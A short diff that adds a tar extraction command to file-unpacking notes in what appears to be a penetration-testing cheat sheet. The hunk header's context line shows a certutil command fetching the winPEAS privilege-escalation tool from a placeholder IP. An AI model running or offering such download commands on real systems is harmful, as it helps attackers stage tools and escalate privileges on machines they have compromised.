@@ -295,4 +295,5 @@ certutil.exe -f -urlcache http://123.123.123.123/winPEASx64.exe winpeas.exe
 ```bash
 unzip file.zip
 7z x file.zip
+tar -xzvf file.tar.gz
 ```
